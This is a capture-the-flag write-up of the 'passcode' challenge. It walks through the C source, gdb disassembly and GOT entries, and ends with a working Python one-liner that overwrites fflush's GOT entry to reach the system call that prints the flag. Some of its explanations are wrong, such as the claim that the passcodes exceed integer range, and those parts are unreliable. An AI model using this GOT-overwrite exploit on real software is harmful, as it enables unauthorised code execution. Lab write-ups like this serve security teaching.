# passcode
slopey112 - 2/24/19

The problem description tells us we need to crack a password system. I run the binary first to see what it does.
```
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : slopey112
Welcome slopey112!
enter passcode1 : 1234
Segmentation fault
```
Segmentation fault? Can we play around with the inputs?
```
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : fasfjpioawjpowjefowjeofjoejfoajwfopwejfop[a[wpefojap[woejfpojopwejfpojw[epofajw[epofjap[ojwfp[eowjf[poawje[fopja[wpoejf[apowjefpojawep[ofjwaef
Welcome fasfjpioawjpowjefowjeofjoejfoajwfopwejfop[a[wpefojap[woejfpojopwejfpojw[epofajw[epofjap[ojwfp[eowjf[!
enter passcode1 : enter passcode2 : checking...
Login Failed!
```
I typed some gibberish as the name, but interestingly enough, I wasn't prompted to enter the first passcode. Seems like a buffer overflow problem. Let's open up the source code.
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```
Ok, so it seems like the `login` function is the meat of this problem. Straight off the bat, it seems like it's impossible to crack it even if we knew what the password was; `passcode1` and `passcode2` both exceed the maximum capacity of integers.

But there's an even more interesting mistake, one that we can use to our advantage: the *value* of `passcode1` and `passcode2` are passed to `scanf`, not its reference. From a low level perspective, the main difference you see here is the difference in usage of `lea` and `mov`.

At the end of the day, the `lea` operation pushes the *address* of a variable, function, or whatever the case may be. But `mov` simply copies the information. So in the compiled code, we'll most likely see `mov` instead of `lea`. This is also why we saw a segmentation fault. Let's call GDB to find out.

```assembly
0x08048564 <+0>:	push   ebp
0x08048565 <+1>:	mov    ebp,esp
0x08048567 <+3>:	sub    esp,0x28
0x0804856a <+6>:	mov    eax,0x8048770
0x0804856f <+11>:	mov    DWORD PTR [esp],eax
0x08048572 <+14>:	call   0x8048420 <printf@plt>
0x08048577 <+19>:	mov    eax,0x8048783
0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx
0x08048583 <+31>:	mov    DWORD PTR [esp],eax
0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
0x0804858b <+39>:	mov    eax,ds:0x804a02c
0x08048590 <+44>:	mov    DWORD PTR [esp],eax
0x08048593 <+47>:	call   0x8048430 <fflush@plt>
0x08048598 <+52>:	mov    eax,0x8048786
0x0804859d <+57>:	mov    DWORD PTR [esp],eax
0x080485a0 <+60>:	call   0x8048420 <printf@plt>
0x080485a5 <+65>:	mov    eax,0x8048783
0x080485aa <+70>:	mov    edx,DWORD PTR [ebp-0xc]
0x080485ad <+73>:	mov    DWORD PTR [esp+0x4],edx
0x080485b1 <+77>:	mov    DWORD PTR [esp],eax
0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
0x080485b9 <+85>:	mov    DWORD PTR [esp],0x8048799
0x080485c0 <+92>:	call   0x8048450 <puts@plt>
0x080485c5 <+97>:	cmp    DWORD PTR [ebp-0x10],0x528e6
0x080485cc <+104>:	jne    0x80485f1 <login+141>
0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
0x080485d5 <+113>:	jne    0x80485f1 <login+141>
0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
0x080485de <+122>:	call   0x8048450 <puts@plt>
0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
0x080485ea <+134>:	call   0x8048460 <system@plt>
0x080485ef <+139>:	leave  
0x080485f0 <+140>:	ret    
0x080485f1 <+141>:	mov    DWORD PTR [esp],0x80487bd
0x080485f8 <+148>:	call   0x8048450 <puts@plt>
0x080485fd <+153>:	mov    DWORD PTR [esp],0x0
0x08048604 <+160>:	call   0x8048480 <exit@plt>
```
This is the dump of the `login` function. Sure enough, when we allocate memory for the passcodes, at `<+24>` and `<+70>`, `mov` is called instead of `lea`. I'm jumping to the gun a little bit, let me back up on why I chose those addresses. We know that `ebp` is called when we're allocating space for local variables. I'm making a guess that those two lines are where `passcode1` and `passcode2` are allocated.

Ok, so we have some idea of what went wrong. Now comes the exploitation. Let's break this down into four parts.
- **How** can we overwrite the buffer?
- **How much** should we overwrite by?
- **Where** should we overwrite to?
- **What** should we overwrite?

Let's start from the top. We know that the first passcode is stored starting at `[ebp-0x10]`. Is there anything that comes before? There sure is: the `welcome` function.
```assembly
0x08048609 <+0>:	push   ebp
0x0804860a <+1>:	mov    ebp,esp
0x0804860c <+3>:	sub    esp,0x88
0x08048612 <+9>:	mov    eax,gs:0x14
0x08048618 <+15>:	mov    DWORD PTR [ebp-0xc],eax
0x0804861b <+18>:	xor    eax,eax
0x0804861d <+20>:	mov    eax,0x80487cb
0x08048622 <+25>:	mov    DWORD PTR [esp],eax
0x08048625 <+28>:	call   0x8048420 <printf@plt>
0x0804862a <+33>:	mov    eax,0x80487dd
0x0804862f <+38>:	lea    edx,[ebp-0x70]
0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx
0x08048636 <+45>:	mov    DWORD PTR [esp],eax
0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
0x0804863e <+53>:	mov    eax,0x80487e3
0x08048643 <+58>:	lea    edx,[ebp-0x70]
0x08048646 <+61>:	mov    DWORD PTR [esp+0x4],edx
0x0804864a <+65>:	mov    DWORD PTR [esp],eax
0x0804864d <+68>:	call   0x8048420 <printf@plt>
0x08048652 <+73>:	mov    eax,DWORD PTR [ebp-0xc]
0x08048655 <+76>:	xor    eax,DWORD PTR gs:0x14
0x0804865c <+83>:	je     0x8048663 <welcome+90>
0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
0x08048663 <+90>:	leave  
0x08048664 <+91>:	ret    
```
Above is the dump of the `welcome` function. It seems that the best way to overwrite this buffer should be to abuse the `welcome` function.

So how much should we overwrite by? Let's take a look at how much space is allocated for this operation. This line tells us all we need:
```assembly
0x0804862f <+38>:	lea    edx,[ebp-0x70]
```
The logic for knowing that this is the line that allocates memory for the char buffer follows the same logic as how the integers were allocated. Also, it seems that memory for the char buffer begins at `$ebp-0x70`. Remember where the first passcode was stored? Doing some math, we find that 0x70 - 0x10 gives us 96 bytes in between. So all we need to do is fill those 96 bytes with some padding.

But let's take a step back. What is our ultimate goal in overflowing the buffer? To redirect command flow, right? There's a golden opportunity for us to do so in this problem: we can bypass the password check altogether.

Let's go back and take a look at the disassembly for `login`.
```assembly
0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
0x080485de <+122>:	call   0x8048450 <puts@plt>
0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
0x080485ea <+134>:	call   0x8048460 <system@plt>
```
This is the part of the code that we want to be at, the system call to `cat flag`. Wouldn't it be great if we could just jump all the way over here? Let's keep track of where we want to go: the address location of `0x080485e3`. In decimal, that is 134514147. So our ultimate goal is to overwrite to here.

Given of all this, what's the best way to go about solving this problem? Turns out we can take advantage of GOT tables. Binaries, by default, are *dynamically-linked*. This means that library functions such as `printf`, `scanf`, `fflush`, etc., must all be loaded from the system, and are not defined within the binary. What if we could take advantage of this?

Let's first load up the addresses of such functions. There's a handy dandy `objdump` flag that lets us do this easily.
```
passcode@ubuntu:~$ objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin@@GLIBC_2.0
0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```
As you can see, these are the functions that the `passcode` binary makes reference to. And so we want to use these to redirect our code flow to the system call.

We'll choose `fflush`, because it is the only one of these functions which are called before the system call which has no null bytes. `objdump` already tells us the address of this function, `0x0804a004`. So now we have all the pieces. Let's put it together.

To recap:
- We can overwrite the buffer by using the `welcome` function
- We must overwrite the buffer by 96 bytes
- We should overwrite to the system call
- We should overwrite the `fflush` function

Let's stitch everything together with Python, and set it off.
```
passcode@ubuntu:~$ python -c 'print "A"*96+"\x04\xa0\x04\x08\n134514147\n"' | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```
The address of `fflush` is passed to `scanf`, and so when it is called, `fflush` is called instead. We have the address of the system call right on top of it on the stack, and so when `fflush` is called, we go directly to the memory address of the system call. 
